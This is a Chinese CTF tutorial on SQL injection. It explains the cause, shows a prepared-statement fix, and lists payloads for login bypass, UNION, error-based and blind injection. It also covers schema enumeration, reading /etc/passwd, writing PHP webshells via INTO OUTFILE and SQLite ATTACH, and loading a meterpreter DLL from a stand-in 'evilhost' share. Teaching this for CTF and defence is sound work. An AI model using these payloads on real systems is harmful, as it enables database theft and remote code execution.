---
title: "SQL注入" 
weight: 7
bookToc: true
---

## SQL基本语法

SQL是Structured Query Language的缩写，意思是结构化查询语言，是一种在数据库管理系统（Relational Database Management System, RDBMS）中查询数据，或通过RDBMS对数据库中的数据进行更改的语言。

在CTF比赛中，最常见的RDBMS是**MySQL、SQLite**

以MySQL为例，SQL基本语句：
```sql
-- 创建数据库
CREATE DATABASE shop;

-- 创建数据表
CREATE TABLE Product
(
    product_id     CHAR(4)      NOT NULL,
    product_name   VARCHAR(100) NOT NULL,
    PRIMARY KEY (product_id)
);

-- 插入语句
INSERT INTO product VALUES (1, 'Apple');

-- 删除语句
DELETE FROM product WHERE id = 1;

-- 更新语句
UPDATE product SET name = 'Pear' WHERE id = 1;

-- 查询语句
SELECT * FROM product WHERE id = 1;
SELECT id FROM product WHERE name = 'Pear';
```

ctf web题目中出现频率比较高的利用语句是查询语句，获取文件系统中的flag文件内容，或者某数据库表中的flag数据

## 漏洞产生原因及修复方式

直接把「用户的输入」拼接到SQL语句中，没有对输入进行过滤或者对SQL进行预编译。「用户的输入」改变了原本SQL的语意，额外执行了其他SQL语句。

举一个网站登陆的例子，假设实现如下：
```php
$name=$_POST['username'];
$pass=$_POST['password'];
$sql="SELECT * FROM users WHERE name='$name' and pass='$pass'";

$result = $conn->query($sql);

if ($result->num_rows > 0) {
    // 登陆成功
} else {
    // 登陆失败
}
```

如果用户输入的 `username` 为 `admin`，`password` 内容为 `' or '1'='1`，最终执行的查询语句就成为了
```sql
SELECT * FROM users WHERE name='admin' and pass='' or '1' = '1'
```
「用户的输入」改变了原本SQL的语意，会触发登陆成功的逻辑

可以使用预处理**修复**上面的漏洞
```php
$name=$_POST['username'];
$pass=$_POST['password'];

$stmt = $conn->prepare("SELECT * FROM users WHERE name = ? AND pass = ?");

$stmt->bind_param("ss", $name, $pass);
$stmt->execute();
$stmt->store_result();

if ($stmt->num_rows > 0) {
    // 登陆成功
} else {
    // 登陆失败
}
```
合理的使用预处理能够解决SQL注入问题，因为其工作原理是：  
将SQL命令与数据分离，在语句实际执行前，先对SQL语句进行编译和优化，这个阶段就**确定了SQL的语意（词法分析，语法分析）**，后续通过参数绑定提供占位符的实际值，可以改变参数，实现只编译一次，但可以多次执行

但是也是要注意正确使用预处理，`$conn->prepare("SELECT * FROM users WHERE name = ? AND pass = ?");` 预处理语句自身不要再使用字符串拼接用户输入部分，不然就无意义了

## SQL注入种类

### 判断注入点

用于快速判断参数是否存在sql注入点并判断注入类型：

- 假设网站原sql语句（字符串型）：
```php
$sql="SELECT * FROM users WHERE name='$name' and pass='$pass'";
```
则 `?name=zqq&pass=1' or '1'='1`
- 假设网站原sql语句（整数型）：
```php
$sql="SELECT * FROM users WHERE id=$id;
```
则 `?id=-1 or 1=1`

网上也称万能密码，但是更要理解其原理

同时为了更好的闭合原sql语句，可能需要加上注释，SQL注释主要有以下3种：
```sql
-- 这是一个单行注释
SELECT * FROM users; -- 这也是注释

# 这是一个单行注释
SELECT * FROM users; # 这也是注释

/* 这是一个
多行注释 */
SELECT * FROM users;
```
url传递注释`-- +`中的`+`urldecode时会被替换为空格，又因为url中的`#`起anchor的作用，不会实际传递给后端服务器，所以需要对`#`urlencode = `%23`

### 联合注入

联合注入依靠页面返回有特定的回显，利用`union select`且短路原sql语句，额外带出想要的数据并显示在页面中

假设页面中返回了`name`信息，我们推测网站原sql语句如下，
```php
SELECT id, name, pass FROM users WHERE name='$name' and pass='$pass'";
```

则联合注入的工作思路是：
```
?name=zqq&pass=-1' ordey by 1 # 2,3,4 ... 确定列数
?name=zqq&pass=-1' union select 1,2,3; # 返回想要的数据，注意-1 让 union select 左边无数据返回
```

### 堆叠注入

输入多条用分号（;）分隔的 SQL 语句时，这些语句通常会按照它们出现的顺序依次执行。堆叠注入一般也是要依靠网页有回显利用。

### 报错注入

报错注入是利用SQL语句执行报错且报错信息回显于页面中

#### XPATH syntax 报错

在mysql（大于5.1版本）中添加了对XML文档进行查询和修改的函数：
- updatexml: 对 XML 数据进行修改。它接收一个原始 XML 字符串，一个 XPath 表达式以定位需要修改的部分，以及一个新的 XML 片段来替换旧的部分
```sql
SELECT updatexml('<Person><Name>John Doe</Name><Age>30</Age></Person>', '//Name', '<Name>Jane Doe</Name>');

<Person><Name>Jane Doe</Name><Age>30</Age></Person>
```
- extractvalue: 用于从 XML 文本中提取数据。它接收一个 XML 字符串和一个 XPath 表达式作为参数，并返回 XPath 表达式指定的 XML 文档部分的内容
```sql
SELECT extractvalue('<Person><Name>John Doe</Name><Age>30</Age></Person>', '//Name');

John Doe
```

当这两个函数在执行时，如果出现xml文档路径错误就会产生报错
```sql
select 1 and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))));

select 1 and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3));
```

![](/data/image/web-sqlxmlerr.png)

#### Duplicate entry-floor函数报错

可以利用floor()这个函数触发Duplicate entry报错，该报错在MySQL的 5.0 版本及以上版本都可以使用，但是在8.0版本已失效
```sql
select count(*),floor(rand(0)*2) x from users group by x;

select count(*),concat(database(),floor(rand(0)*2)) as x from information_schema.tables group by x;
```
注意相关表中需要有3条数据，才能触发报错

原理解析参看这篇[博客](https://www.cnblogs.com/smileleooo/p/18202852#floor%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99)，关键要理解`floor(rand(0)*2)`被执行多次的含义

### 盲注

盲注相较于上述注入种类，无法获得回显信息，页面无任何信息返回，或者页面只有2种显示状态的区别，观察应用程序的响应时长或页面区别来确定注入是否成功，以及探测数据库中的数据。

盲注的两种主要形式是：
- 基于布尔的盲注（Boolean-based Blind Injection）: 基于布尔条件的判断来获取有关数据库内容的信息，尝试不同的条件并根据应用程序的响应来验证其正确性。
```sql
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) = 97
?id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public') > 10
?id=1 AND LENGTH((SELECT database())) = 6
```
- 基于时间的盲注（Time-based Blind Injection）: 使用延时函数或计算耗时操作，以观察应用程序对恶意查询的处理时间。通过观察响应时间的变化，攻击者可以逐渐推断数据库中的数据。
```sql
id=1; IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), NULL)
-- time-consuming operation (BENCHMARK) that calculates the MD5 hash of the string 'a' 10,000,000 times. 
id=1; IF((SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1))) = 97, BENCHMARK(10000000, MD5('a')), NULL) 
```

盲注需要搭配自动化的工具不断调整输入探测数据，可以使用`Burp Suite`或者`SQLMap`

## 获取表结构等信息

整理获取特定信息SQL语句，主要针对`MySQL`和`SQLite`2种类型

### MySQL

获取版本
```sql
select version();
```

`information_schema`是mysql自带的一个数据库，包含了各种原数据，可以获取以下信息

获取所有databases
```sql
select group_concat(schema_name) from information_schema.schemata;

show databases;
```

获取当前database
```sql
select database()
```

获取当前数据库的所有表tables
```sql
select group_concat(table_name) from information_schema.tables where 
table_schema = database()
```

获取某个表的所有columns
```sql
select group_concat(column_name) from information_schema.columns where 
table_schema = database() and table_name = 'users'
```

获取某个表中的数据
```sql
select group_concat(id,':',username,':',password) from users
```

读写文件
```sql
show global variables like '%secure_file_priv%';
-- secure_file_priv NULL 表示不可用， 空 表示可用
-- 在 MySQL 5.5.3 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件；近一步限制可以设置更具体的路径，比如/usr/
-- 在 MySQL 5.5.3 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件

select load_file('/etc/passwd');

-- 需要写入文件不存在
select  '<?php eval($_POST[\'hack\'])?>',2 into outfile '/var/www/dvwa/shell.php';
```

### SQLite

数据库结构
```sql
SELECT sql FROM sqlite_schema
-- if sqlite_version > 3.33.0
SELECT sql FROM sqlite_master
```

表名
```sql
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

列名
```sql
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
```

命令执行
```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");

UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');
```

详细可以[参看](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

## 绕过

## SQLMap